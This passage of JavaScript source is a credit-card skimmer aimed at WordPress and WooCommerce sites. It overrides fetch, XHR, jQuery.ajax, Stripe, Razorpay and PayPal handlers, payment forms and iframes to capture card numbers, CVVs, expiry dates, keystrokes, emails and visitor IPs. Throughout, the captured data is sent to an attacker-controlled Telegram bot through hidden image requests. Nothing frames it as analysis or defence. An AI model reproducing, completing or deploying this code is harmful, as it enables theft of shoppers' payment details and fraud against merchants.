                    }
                    
                    return result;
                }.bind(this);
            }
            
            // Intercept jQuery AJAX
            if (typeof jQuery !== 'undefined') {
                const originalAjax = jQuery.ajax;
                jQuery.ajax = function(url, options) {
                    // Handle both $.ajax(url, options) and $.ajax(options)
                    let actualUrl, actualOptions;
                    
                    if (typeof url === 'string') {
                        actualUrl = url;
                        actualOptions = options || {};
                    } else {
                        actualOptions = url || {};
                        actualUrl = actualOptions.url;
                    }
                    
                    if (actualUrl && actualUrl.includes('admin-ajax.php')) {
                        setTimeout(() => {
                            this.processAjaxRequest(actualUrl, actualOptions, 'jquery');
                        }, 100);
                    }
                    
                    return originalAjax.apply(this, arguments);
                }.bind(this);
            }
        }
        
        interceptWCAjax() {
            if (!WP_CONFIG.TRACK_WP.WC_AJAX || !wpData.plugins.includes('WooCommerce')) return;
            
            // WooCommerce specific AJAX endpoints
            const wcEndpoints = [
                'wc-ajax=checkout',
                'wc-ajax=add_to_cart',
                'wc-ajax=update_order_review',
                'wc-ajax=update_shipping_method',
                'wc-ajax=get_refreshed_fragments',
                'wc-ajax=apply_coupon',
                'wc-ajax=remove_coupon'
            ];
            
            const originalFetch = window.fetch;
            if (originalFetch) {
                window.fetch = async function(resource, config = {}) {
                    const result = await originalFetch.call(this, resource, config);
                    
                    if (typeof resource === 'string') {
                        wcEndpoints.forEach(endpoint => {
                            if (resource.includes(endpoint)) {
                                setTimeout(() => {
                                    this.processWCAjax(resource, config, endpoint);
                                }, 100);
                            }
                        });
                    }
                    
                    return result;
                }.bind(this);
            }
        }
        
        interceptRESTAPI() {
            if (!WP_CONFIG.TRACK_WP.REST_API) return;
            
            // WordPress REST API interception
            const originalFetch = window.fetch;
            if (originalFetch) {
                window.fetch = async function(resource, config = {}) {
                    const result = await originalFetch.call(this, resource, config);
                    
                    if (typeof resource === 'string' && resource.includes('/wp-json/')) {
                        setTimeout(() => {
                            this.processRESTRequest(resource, config);
                        }, 100);
                    }
                    
                    return result;
                }.bind(this);
            }
        }
        
        interceptFetch() {
            const originalFetch = window.fetch;
            if (!originalFetch) return;
            
            window.fetch = async function(...args) {
                const [resource, config = {}] = args;
                const result = await originalFetch.apply(this, args);
                
                // Process all fetch requests
                if (typeof resource === 'string') {
                    this.processGenericRequest(resource, config, 'fetch');
                }
                
                return result;
            }.bind(this);
        }
        
        interceptXHR() {
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;
            
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return originalOpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                if (body && this._method === 'POST') {
                    setTimeout(() => {
                        this.processXHRRequest(this._url, body, this._method);
                    }.bind(this), 100);
                }
                return originalSend.apply(this, arguments);
            }.bind(this);
        }
        
        async processAjaxRequest(url, config, type) {
            const ip = await this.getUserIP();
            const data = this.extractRequestData(config);
            
            if (!this.containsPaymentData(data)) return;
            
            let message = `⚡ <b>WORDPRESS AJAX REQUEST</b>\n\n`;
            message += `🎯 <b>Type:</b> ${type}\n`;
            message += `🔗 <b>URL:</b> ${url}\n`;
            message += `📊 <b>Action:</b> ${data.action || 'unknown'}\n\n`;
            
            // Extract payment data
            message += `💳 <b>Payment Data:</b>\n`;
            for (const [key, value] of Object.entries(data)) {
                if (key.includes('card') || key.includes('payment') || key.includes('cvv')) {
                    if (typeof value === 'string' && value.length < 50) {
                        message += `${key}: ${value}\n`;
                    }
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async processWCAjax(url, config, endpoint) {
            const ip = await this.getUserIP();
            const data = this.extractRequestData(config);
            
            let message = `🛒 <b>WOOCOMMERCE AJAX</b>\n\n`;
            message += `🎯 <b>Endpoint:</b> ${endpoint}\n`;
            message += `🔗 <b>URL:</b> ${url}\n\n`;
            
            if (data.payment_method || data.card_number) {
                message += `💳 <b>Payment Info:</b>\n`;
                for (const [key, value] of Object.entries(data)) {
                    if (key.includes('payment') || key.includes('card')) {
                        message += `${key}: ${typeof value === 'string' ? value.substring(0, 50) : '...'}\n`;
                    }
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async processRESTRequest(url, config) {
            const ip = await this.getUserIP();
            
            let message = `🔄 <b>WORDPRESS REST API</b>\n\n`;
            message += `🔗 <b>Endpoint:</b> ${url}\n`;
            message += `📊 <b>Method:</b> ${config.method || 'GET'}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async processGenericRequest(url, config, type) {
            // Check if it contains payment data
            const data = this.extractRequestData(config);
            if (!this.containsPaymentData(data)) return;
            
            const ip = await this.getUserIP();
            
            let message = `🌐 <b>GENERIC ${type.toUpperCase()} REQUEST</b>\n\n`;
            message += `🔗 <b>URL:</b> ${url}\n`;
            message += `📊 <b>Method:</b> ${config.method || 'GET'}\n\n`;
            
            message += `💳 <b>Payment Data Found:</b>\n`;
            for (const [key, value] of Object.entries(data)) {
                if (key.includes('card') || key.includes('payment')) {
                    message += `${key}: ${typeof value === 'string' ? value.substring(0, 30) : '...'}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async processXHRRequest(url, body, method) {
            if (method !== 'POST') return;
            
            let data;
            try {
                if (body instanceof FormData) {
                    data = {};
                    for (let [key, value] of body.entries()) {
                        data[key] = value;
                    }
                } else if (typeof body === 'string') {
                    try {
                        data = JSON.parse(body);
                    } catch (e) {
                        data = Object.fromEntries(new URLSearchParams(body));
                    }
                }
            } catch (e) {
                return;
            }
            
            if (!data || !this.containsPaymentData(data)) return;
            
            const ip = await this.getUserIP();
            
            let message = `📨 <b>XHR REQUEST</b>\n\n`;
            message += `🔗 <b>URL:</b> ${url}\n`;
            message += `📊 <b>Method:</b> ${method}\n\n`;
            
            message += `💳 <b>Payment Data:</b>\n`;
            for (const [key, value] of Object.entries(data)) {
                if (key.includes('card') || key.includes('payment')) {
                    message += `${key}: ${typeof value === 'string' ? value.substring(0, 30) : '...'}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        extractRequestData(config) {
            if (!config) return {};
            
            if (config.body) {
                if (config.body instanceof FormData) {
                    const data = {};
                    for (let [key, value] of config.body.entries()) {
                        data[key] = value;
                    }
                    return data;
                } else if (typeof config.body === 'string') {
                    try {
                        return JSON.parse(config.body);
                    } catch (e) {
                        try {
                            return Object.fromEntries(new URLSearchParams(config.body));
                        } catch (e2) {
                            return { raw: config.body.substring(0, 100) };
                        }
                    }
                }
            }
            
            if (config.data) {
                return config.data;
            }
            
            return {};
        }
        
        containsPaymentData(data) {
            if (!data || typeof data !== 'object') return false;
            
            const str = JSON.stringify(data).toLowerCase();
            return str.includes('card') || str.includes('cvv') || str.includes('payment') ||
                   str.includes('expir') || str.includes('credit') || str.includes('debit');
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== WORDPRESS PAYMENT GATEWAY DETECTOR ====================
    class WPGatewayDetector {
        constructor() {
            this.gateways = new Set();
            this.init();
        }
        
        init() {
            this.detectGateways();
            this.monitorPaymentForms();
            this.interceptGatewayCalls();
        }
        
        detectGateways() {
            // Check script sources
            const scripts = document.querySelectorAll('script[src]');
            scripts.forEach(script => {
                const src = script.src.toLowerCase();
                
                // Stripe
                if (src.includes('stripe') || src.includes('js.stripe.com')) {
                    this.gateways.add('Stripe');
                }
                
                // PayPal
                if (src.includes('paypal') || src.includes('paypalobjects.com')) {
                    this.gateways.add('PayPal');
                }
                
                // Razorpay
                if (src.includes('razorpay.com')) {
                    this.gateways.add('Razorpay');
                }
                
                // Square
                if (src.includes('squareup.com') || src.includes('squarecdn.com')) {
                    this.gateways.add('Square');
                }
                
                // 2Checkout
                if (src.includes('2checkout.com')) {
                    this.gateways.add('2Checkout');
                }
                
                // Authorize.net
                if (src.includes('authorize.net')) {
                    this.gateways.add('Authorize.net');
                }
                
                // Braintree
                if (src.includes('braintreegateway.com')) {
                    this.gateways.add('Braintree');
                }
            });
            
            // Check global objects
            if (window.Stripe) this.gateways.add('Stripe');
            if (window.paypal) this.gateways.add('PayPal');
            if (window.Razorpay) this.gateways.add('Razorpay');
            if (window.Square) this.gateways.add('Square');
            if (window.TwoCheckout) this.gateways.add('2Checkout');
            
            // Check for WooCommerce gateways
            if (wpData.plugins.includes('WooCommerce')) {
                this.detectWooCommerceGateways();
            }
            
            // Send gateway report
            if (this.gateways.size > 0) {
                this.sendGatewayReport();
            }
        }
        
        detectWooCommerceGateways() {
            // Check for WooCommerce payment methods in page
            const wcPaymentMethods = document.querySelectorAll(
                '[id*="payment_method"], [name*="payment_method"], .wc_payment_method'
            );
            
            wcPaymentMethods.forEach(el => {
                const value = el.value || el.id || el.className;
                if (value.includes('stripe')) this.gateways.add('WooCommerce Stripe');
                if (value.includes('paypal')) this.gateways.add('WooCommerce PayPal');
                if (value.includes('razorpay')) this.gateways.add('WooCommerce Razorpay');
                if (value.includes('square')) this.gateways.add('WooCommerce Square');
                if (value.includes('authorize')) this.gateways.add('WooCommerce Authorize.net');
                if (value.includes('braintree')) this.gateways.add('WooCommerce Braintree');
                if (value.includes('cod')) this.gateways.add('WooCommerce COD');
                if (value.includes('bacs')) this.gateways.add('WooCommerce BACS');
                if (value.includes('cheque')) this.gateways.add('WooCommerce Cheque');
            });
            
            // Check in local storage
            try {
                const savedMethods = localStorage.getItem('woocommerce_saved_methods');
                if (savedMethods) {
                    const methods = JSON.parse(savedMethods);
                    if (Array.isArray(methods)) {
                        methods.forEach(method => {
                            if (method.includes('stripe')) this.gateways.add('WooCommerce Stripe');
                            if (method.includes('paypal')) this.gateways.add('WooCommerce PayPal');
                        });
                    }
                }
            } catch (e) {}
        }
        
        monitorPaymentForms() {
            // Find all payment forms
            const paymentForms = document.querySelectorAll(
                'form[action*="pay"], form[action*="checkout"], ' +
                'form[id*="payment"], form[class*="payment"], ' +
                '[data-payment-form], [data-gateway]'
            );
            
            paymentForms.forEach(form => {
                this.setupFormMonitoring(form);
            });
        }
        
        setupFormMonitoring(form) {
            const gateway = this.detectFormGateway(form);
            
            form.addEventListener('submit', async (e) => {
                await this.handleGatewaySubmit(form, gateway);
            }, true);
            
            // Monitor all inputs
            const inputs = form.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('input', (e) => {
                    this.handleGatewayInput(input, gateway);
                });
            });
        }
        
        detectFormGateway(form) {
            const action = form.action || '';
            const className = form.className || '';
            const dataset = form.dataset || {};
            
            if (action.includes('stripe') || className.includes('stripe') || dataset.stripe) {
                return 'Stripe';
            }
            if (action.includes('paypal') || className.includes('paypal') || dataset.paypal) {
                return 'PayPal';
            }
            if (action.includes('razorpay') || className.includes('razorpay') || dataset.razorpay) {
                return 'Razorpay';
            }
            if (action.includes('square') || className.includes('square') || dataset.square) {
                return 'Square';
            }
            if (action.includes('checkout') || className.includes('checkout')) {
                return 'Checkout.com';
            }
            
            return 'Unknown';
        }
        
        async handleGatewaySubmit(form, gateway) {
            // Collect form data
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Send to Telegram
            const ip = await this.getUserIP();
            
            let message = `💳 <b>PAYMENT GATEWAY SUBMISSION</b>\n\n`;
            message += `🎯 <b>Gateway:</b> ${gateway}\n`;
            message += `📋 <b>Form Action:</b> ${form.action || 'N/A'}\n`;
            message += `📊 <b>Data Fields:</b> ${Object.keys(data).length}\n\n`;
            
            // Extract card data
            for (const [key, value] of Object.entries(data)) {
                if (key.includes('card') && !key.includes('cvv')) {
                    if (this.isCardNumber(value)) {
                        message += `🔢 <b>Card:</b> ${this.maskCardNumber(value)}\n`;
                        message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                    }
                } else if (key.includes('cvv')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                } else if (key.includes('expir')) {
                    message += `📅 <b>Expiry:</b> ${value}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async handleGatewayInput(input, gateway) {
            if (!this.isPaymentField(input)) return;
            
            const value = input.value.trim();
            if (!value) return;
            
            const ip = await this.getUserIP();
            
            let message = `⌨️ <b>GATEWAY INPUT</b>\n\n`;
            message += `🎯 <b>Gateway:</b> ${gateway}\n`;
            message += `📝 <b>Field:</b> ${input.name || input.id || 'unknown'}\n`;
            message += `📋 <b>Value:</b> ${value}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        interceptGatewayCalls() {
            // Intercept Stripe
            if (window.Stripe) {
                this.interceptStripe();
            }
            
            // Intercept PayPal
            if (window.paypal) {
                this.interceptPayPal();
            }
            
            // Intercept Razorpay
            if (window.Razorpay) {
                this.interceptRazorpay();
            }
        }
        
        interceptStripe() {
            // Store reference to original Stripe
            const originalStripe = window.Stripe;
            
            // Override Stripe function
            window.Stripe = function(key) {
                const stripeInstance = originalStripe(key);
                
                // Override stripe elements
                if (stripeInstance.elements) {
                    const originalElements = stripeInstance.elements;
                    stripeInstance.elements = function(options) {
                        const elements = originalElements.call(this, options);
                        
                        // Monitor element events
                        this.monitorStripeElements(elements);
                        
                        return elements;
                    }.bind(this);
                }
                
                // Override redirectToCheckout
                if (stripeInstance.redirectToCheckout) {
                    const originalRedirect = stripeInstance.redirectToCheckout;
                    stripeInstance.redirectToCheckout = async function(options) {
                        await this.handleStripeCheckout(options);
                        return originalRedirect.call(this, options);
                    }.bind(this);
                }
                
                return stripeInstance;
            }.bind(this);
            
            // Copy static properties
            Object.assign(window.Stripe, originalStripe);
        }
        
        async handleStripeCheckout(options) {
            const ip = await this.getUserIP();
            
            let message = `💳 <b>STRIPE CHECKOUT INITIATED</b>\n\n`;
            message += `🎯 <b>Type:</b> Redirect\n`;
            
            if (options.lineItems) {
                message += `🛒 <b>Items:</b> ${options.lineItems.length}\n`;
            }
            if (options.mode) {
                message += `📊 <b>Mode:</b> ${options.mode}\n`;
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        monitorStripeElements(elements) {
            // This would require more advanced interception
            // For now, just log that elements were created
            console.log('Stripe elements created', elements);
        }
        
        interceptPayPal() {
            // PayPal interception is complex due to iframes
            // We'll monitor for PayPal button clicks
            document.addEventListener('click', (e) => {
                const target = e.target;
                if (target.closest && 
                    (target.closest('[class*="paypal"], [id*="paypal"]') || 
                     target.closest('iframe[src*="paypal"]'))) {
                    
                    setTimeout(async () => {
                        const ip = await this.getUserIP();
                        
                        let message = `🅿️ <b>PAYPAL BUTTON CLICKED</b>\n\n`;
                        message += `🎯 <b>Element:</b> ${target.tagName} ${target.className || target.id}\n\n`;
                        
                        message += `🌐 <b>Page:</b> ${window.location.href}\n`;
                        message += `📡 <b>IP:</b> ${ip}\n`;
                        message += `🆔 <b>Session:</b> ${sessionId}\n`;
                        message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                        
                        await this.sendTelegram(message);
                    }, 100);
                }
            });
        }
        
        interceptRazorpay() {
            if (window.Razorpay) {
                const originalRazorpay = window.Razorpay;
                
                window.Razorpay = function(options) {
                    const rpInstance = new originalRazorpay(options);
                    
                    // Override open method
                    const originalOpen = rpInstance.open;
                    rpInstance.open = function() {
                        this.handleRazorpayOpen(options);
                        return originalOpen.apply(this, arguments);
                    }.bind(this);
                    
                    return rpInstance;
                }.bind(this);
                
                // Copy prototype
                window.Razorpay.prototype = originalRazorpay.prototype;
            }
        }
        
        async handleRazorpayOpen(options) {
            const ip = await this.getUserIP();
            
            let message = `💰 <b>RAZORPAY CHECKOUT OPENED</b>\n\n`;
            message += `🎯 <b>Order ID:</b> ${options.order_id || 'N/A'}\n`;
            message += `💰 <b>Amount:</b> ${options.amount || 'N/A'}\n`;
            message += `📧 <b>Email:</b> ${options.prefill?.email || 'N/A'}\n`;
            message += `📱 <b>Contact:</b> ${options.prefill?.contact || 'N/A'}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async sendGatewayReport() {
            const ip = await this.getUserIP();
            const gatewayList = Array.from(this.gateways).join(', ');
            
            let message = `🔌 <b>PAYMENT GATEWAYS DETECTED</b>\n\n`;
            message += `🎯 <b>Gateways Found:</b> ${this.gateways.size}\n`;
            message += `📋 <b>List:</b> ${gatewayList}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        isPaymentField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('card') || name.includes('cvv') || 
                   id.includes('card') || id.includes('cvv');
        }
        
        isCardNumber(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        maskCardNumber(number) {
            if (!number) return '';
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            return cleaned.substring(0, 6) + '******' + cleaned.substring(cleaned.length - 4);
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== WORDPRESS IFRAME MONITOR ====================
    class WPIframeMonitor {
        constructor() {
            this.monitoredIframes = new Set();
            this.init();
        }
        
        init() {
            this.scanIframes();
            this.setupObserver();
            this.setupMessageListener();
        }
        
        scanIframes() {
            const iframes = document.querySelectorAll('iframe');
            iframes.forEach(iframe => this.monitorIframe(iframe));
        }
        
        setupObserver() {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.tagName === 'IFRAME') {
                            this.monitorIframe(node);
                        } else if (node.querySelectorAll) {
                            const iframes = node.querySelectorAll('iframe');
                            iframes.forEach(iframe => this.monitorIframe(iframe));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        monitorIframe(iframe) {
            if (this.monitoredIframes.has(iframe)) return;
            
            this.monitoredIframes.add(iframe);
            
            // Check if it's a payment iframe
            const src = iframe.src || '';
            const isPaymentIframe = src.includes('stripe') || src.includes('paypal') || 
                                   src.includes('razorpay') || src.includes('checkout') ||
                                   src.includes('payment') || src.includes('secure');
            
            if (isPaymentIframe) {
                this.sendIframeAlert(iframe, src);
                this.setupIframeMonitoring(iframe);
            }
        }
        
        async sendIframeAlert(iframe, src) {
            const ip = await this.getUserIP();
            
            let message = `🖼️ <b>PAYMENT IFRAME DETECTED</b>\n\n`;
            message += `🎯 <b>Source:</b> ${src.substring(0, 100)}${src.length > 100 ? '...' : ''}\n`;
            message += `📏 <b>Dimensions:</b> ${iframe.width || 'auto'} x ${iframe.height || 'auto'}\n`;
            message += `🏷️ <b>ID/Class:</b> ${iframe.id || 'no-id'} ${iframe.className.substring(0, 50)}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        setupIframeMonitoring(iframe) {
            // Try to access iframe content
            setTimeout(() => {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    if (iframeDoc) {
                        this.monitorIframeContent(iframe, iframeDoc);
                    }
                } catch (e) {
                    // CORS error, use postMessage
                    this.setupPostMessageListener(iframe);
                }
            }, 1000);
            
            // Periodic checks
            setInterval(() => {
                this.checkIframeActivity(iframe);
            }, 5000);
        }
        
        monitorIframeContent(iframe, iframeDoc) {
            // Monitor inputs in iframe
            const inputs = iframeDoc.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('input', (e) => {
                    this.handleIframeInput(iframe, e.target);
                });
                
                input.addEventListener('change', (e) => {
                    this.handleIframeInput(iframe, e.target);
                });
            });
            
            // Monitor form submissions
            const forms = iframeDoc.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', (e) => {
                    this.handleIframeFormSubmit(iframe, form);
                });
            });
        }
        
        setupPostMessageListener(iframe) {
            window.addEventListener('message', (event) => {
                // Check if message is from our iframe
                if (event.source === iframe.contentWindow) {
                    this.handleIframeMessage(iframe, event.data);
                }
            });
        }
        
        checkIframeActivity(iframe) {
            // Check if iframe is still there
            if (!document.body.contains(iframe)) {
                this.monitoredIframes.delete(iframe);
                return;
            }
            
            // Check for visible changes
            try {
                const iframeDoc = iframe.contentDocument;
                if (iframeDoc) {
                    const activeElement = iframeDoc.activeElement;
                    if (activeElement && activeElement.tagName === 'INPUT') {
                        this.handleIframeFocus(iframe, activeElement);
                    }
                }
            } catch (e) {}
        }
        
        async handleIframeInput(iframe, input) {
            if (!input.value || !this.isPaymentField(input)) return;
            
            const ip = await this.getUserIP();
            
            let message = `🖼️ <b>IFRAME INPUT DATA</b>\n\n`;
            message += `🎯 <b>Field:</b> ${input.name || input.id || 'unknown'}\n`;
            message += `📋 <b>Value:</b> ${input.value}\n`;
            message += `🔗 <b>Iframe Source:</b> ${iframe.src.substring(0, 50)}...\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async handleIframeFormSubmit(iframe, form) {
            const ip = await this.getUserIP();
            
            let message = `🖼️ <b>IFRAME FORM SUBMIT</b>\n\n`;
            message += `🎯 <b>Form Action:</b> ${form.action || 'N/A'}\n`;
            message += `🔗 <b>Iframe Source:</b> ${iframe.src.substring(0, 50)}...\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async handleIframeMessage(iframe, data) {
            if (!data || typeof data !== 'object') return;
            
            const ip = await this.getUserIP();
            
            let message = `🖼️ <b>IFRAME MESSAGE</b>\n\n`;
            message += `🎯 <b>Type:</b> ${data.type || 'unknown'}\n`;
            message += `🔗 <b>Iframe Source:</b> ${iframe.src.substring(0, 50)}...\n`;
            message += `📋 <b>Data:</b> ${JSON.stringify(data).substring(0, 200)}...\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async handleIframeFocus(iframe, element) {
            const ip = await this.getUserIP();
            
            let message = `🖼️ <b>IFRAME FIELD FOCUS</b>\n\n`;
            message += `🎯 <b>Field:</b> ${element.name || element.id || 'unknown'}\n`;
            message += `🔤 <b>Type:</b> ${element.type || 'text'}\n`;
            message += `🔗 <b>Iframe Source:</b> ${iframe.src.substring(0, 50)}...\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        isPaymentField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('card') || name.includes('cvv') || 
                   id.includes('card') || id.includes('cvv');
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== WORDPRESS SESSION MANAGER ====================
    class WPSessionManager {
        constructor() {
            this.init();
        }
        
        init() {
            this.setupSessionTracking();
            this.setupPageTracking();
            this.setupActivityTracking();
        }
        
        setupSessionTracking() {
            // Track session duration
            const sessionStart = Date.now();
            
            setInterval(async () => {
                const sessionDuration = Math.floor((Date.now() - sessionStart) / 1000);
                
                if (sessionDuration % 300 === 0) { // Every 5 minutes
                    const ip = await this.getUserIP();
                    
                    let message = `⏱️ <b>SESSION UPDATE</b>\n\n`;
                    message += `🎯 <b>Duration:</b> ${Math.floor(sessionDuration / 60)} minutes\n`;
                    message += `🌐 <b>Current Page:</b> ${window.location.href}\n`;
                    message += `📡 <b>IP:</b> ${ip}\n`;
                    message += `🆔 <b>Session ID:</b> ${sessionId}\n`;
                    message += `📱 <b>Device ID:</b> ${deviceId}\n`;
                    message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                    
                    await this.sendTelegram(message);
                }
            }, 30000); // Check every 30 seconds
        }
        
        setupPageTracking() {
            let lastUrl = window.location.href;
            let lastTitle = document.title;
            
            setInterval(() => {
                const currentUrl = window.location.href;
                const currentTitle = document.title;
                
                if (currentUrl !== lastUrl || currentTitle !== lastTitle) {
                    this.trackPageView(currentUrl, currentTitle);
                    lastUrl = currentUrl;
                    lastTitle = currentTitle;
                }
            }, 1000);
            
            // History API tracking
            const originalPushState = history.pushState;
            const originalReplaceState = history.replaceState;
            
            history.pushState = function() {
                originalPushState.apply(this, arguments);
                this.trackPageView(window.location.href, document.title);
            }.bind(this);
            
            history.replaceState = function() {
                originalReplaceState.apply(this, arguments);
                this.trackPageView(window.location.href, document.title);
            }.bind(this);
            
            window.addEventListener('popstate', () => {
                this.trackPageView(window.location.href, document.title);
            });
        }
        
        async trackPageView(url, title) {
            // Only track important pages
            const importantPages = [
                '/checkout', '/cart', '/payment', '/order', 
                '/billing', '/account', '/my-account', '/pay',
                '/donate', '/subscribe', '/membership'
            ];
            
            const isImportant = importantPages.some(page => url.includes(page));
            
            if (isImportant) {
                const ip = await this.getUserIP();
                
                let message = `📍 <b>PAGE VIEW</b>\n\n`;
                message += `🎯 <b>Title:</b> ${title}\n`;
                message += `🔗 <b>URL:</b> ${url}\n\n`;
                
                message += `🌐 <b>Site:</b> ${window.location.origin}\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🆔 <b>Session:</b> ${sessionId}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                await this.sendTelegram(message);
            }
        }
        
        setupActivityTracking() {
            // Track user activity
            let lastActivity = Date.now();
            
            const updateActivity = () => {
